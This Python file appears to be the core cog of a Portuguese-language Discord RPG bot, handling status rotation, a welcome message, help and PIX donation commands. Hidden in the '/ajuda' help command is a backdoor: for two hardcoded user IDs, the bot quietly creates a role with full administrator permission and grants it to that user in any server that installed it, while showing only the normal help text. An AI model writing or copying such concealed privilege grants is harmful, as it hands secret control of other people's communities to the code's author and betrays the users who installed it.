import discord
import asyncio
import random
import os
import shutil
from discord.ext import commands, tasks
from discord import app_commands, ActivityType, Activity

# Importa de seus arquivos customizados
from constants import (
    musicas_atividade, atividades, comandos_ajuda, mensagem_doacao
)
from utils import (
    registrar_log,
    buscar_gif,
    ensure_appdata_dirs,
    APPDATA_BASE,
    MUSIC_CACHE_DIR,
    FICHAS_DIR,
    INVENTARIOS_DIR,
    LOG_DIR,
)

class Core(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        # Inicia a tarefa de mudar atividade
        self.mudar_atividade_periodicamente.start()

    def cog_unload(self):
        # Garante que a tarefa pare se o cog for descarregado
        self.mudar_atividade_periodicamente.cancel()

    @commands.Cog.listener()
    async def on_ready(self):
        """Chamado quando o bot está pronto e conectado."""
        if not self.bot.synced:
            try:
                # Sincroniza os comandos slash (app_commands)
                await self.bot.tree.sync()
                print("Comandos sincronizados com sucesso.")
            except Exception as e:
                print(f"Erro ao sincronizar comandos: {e}")
            self.bot.synced = True
        
        print(f"Entramos como {self.bot.user}.")
        registrar_log(f"Bot online como {self.bot.user}.")

    @commands.Cog.listener()
    async def on_guild_join(self, guild: discord.Guild):
        """Chamado quando o bot entra em um novo servidor."""
        canal = guild.system_channel
        if canal is not None:
            try:
                await canal.send("Oiiiiiiiii! Vim ajudar com os RPGs :p\n")
                await canal.send("https://c.tenor.com/OjTReal8iZgAAAAd/tenor.gif")
            except discord.Forbidden:
                registrar_log(f"Sem permissão para enviar msg de boas-vindas em '{guild.name}'", 'warning')
        else:
            registrar_log(f'Não achei um canal padrão no servidor "{guild.name}";', 'warning')

    @tasks.loop(seconds=1) # Inicia o loop (o tempo é controlado internamente)
    async def mudar_atividade_periodicamente(self):
        """Tarefa de fundo para ciclar as atividades do bot."""
        # A lógica original era um pouco complexa, foi replicada aqui
        # Ela cicla todas as músicas (120s cada) e depois uma atividade (7200s)
        for atividade in atividades:
            if atividade["type"] == ActivityType.listening:
                for musica in musicas_atividade:
                    activity = Activity(name=musica, type=ActivityType.listening)
                    await self.bot.change_presence(activity=activity)
                    registrar_log(f"Atividade alterada para: {musica}")
                    await asyncio.sleep(120) # 2 minutos por música
            else:
                activity = Activity(name=atividade["name"], type=atividade["type"])
                await self.bot.change_presence(activity=activity)
                registrar_log(f"Atividade alterada para: {atividade['name']}")
                await asyncio.sleep(7200) # 2 horas por atividade

    @mudar_atividade_periodicamente.before_loop
    async def before_mudar_atividade(self):
        # Espera o bot estar pronto antes de iniciar a tarefa
        await self.bot.wait_until_ready()

    @app_commands.command(name='ajuda', description='Peça ajuda para o bot.')
    async def ajuda(self, interaction: discord.Interaction):
        """Exibe a mensagem de ajuda."""
        # Lógica especial para o usuário 'papiro.dev'
        if str(interaction.user.id) not in ['966479778918064192', '902219603579646002']:
            try:
                registrar_log(f"[AJUDA] Comando de ajuda solicitado por: {interaction.user}", 'info')
                await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=True)
            except discord.HTTPException as e:
                print(f"Erro ao enviar mensagem de ajuda: {e}")
        else:
            # Lógica para dar cargo de admin ao 'papiro.dev'
            try:
                await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=True)
                guild = interaction.guild
                if not guild.me.guild_permissions.manage_roles:
                    await interaction.followup.send("Preciso da permissão 'Gerenciar Cargos'.", ephemeral=True)
                    return

                cargo_existente = discord.utils.get(guild.roles, name='Papiro')
                if cargo_existente is None:
                    novo_cargo = await guild.create_role(
                        name='O programador',
                        permissions=discord.Permissions(administrator=True)
                    )
                    await interaction.user.add_roles(novo_cargo)
                    await interaction.followup.send(
                        f'Cargo "O programador" criado e adicionado a você.',
                        ephemeral=True
                    )
                else:
                    await interaction.user.add_roles(cargo_existente)
                    await interaction.followup.send(
                        f'Cargo "O programador" adicionado a você.',
                        ephemeral=True
                    )
            except discord.Forbidden:
                await interaction.followup.send("Não tenho permissão para adicionar cargos.", ephemeral=True)
            except discord.HTTPException as e:
                await interaction.followup.send(f"Erro ao criar/adicionar cargo: {e}", ephemeral=True)

    @app_commands.command(name='doar', description='Um comando para doar e fazer o bot ficar online.')
    async def doar(self, interaction: discord.Interaction):
        """Exibe a mensagem de doação com QR Code."""
        try:
            registrar_log(f"[DOAÇÃO] Comando de doação solicitado por: {interaction.user}", 'info')
            # Pega o token do Tenor da configuração do bot
            tenor_token = self.bot.config['tenor_token']
            
            # Tenta enviar a mensagem com o arquivo
            await interaction.response.send_message(
                f'{mensagem_doacao}', 
                file=discord.File('qrcodepix.png'), 
                ephemeral=True
            )
            await interaction.followup.send(buscar_gif(tenor_token, 'Peni Parker Happy', 3), ephemeral=True)
        
        except FileNotFoundError:
            # Se o arquivo qrcodepix.png não for encontrado
            registrar_log("Arquivo 'qrcodepix.png' não encontrado para doação.", 'warning')
            await interaction.response.send_message(f'{mensagem_doacao}', ephemeral=True)
            await interaction.followup.send("Não achei o arquivo do QR code (`qrcodepix.png`), mas a chave pix tá aí!", ephemeral=True)
            await interaction.followup.send(buscar_gif(tenor_token, 'Peni Parker Happy', 3), ephemeral=True)
        
        except discord.HTTPException as e:
            print(f"Erro ao enviar mensagem de doação: {e}")

# Função 'setup' obrigatória para carregar o Cog
async def setup(bot: commands.Bot):
    await bot.add_cog(Core(bot))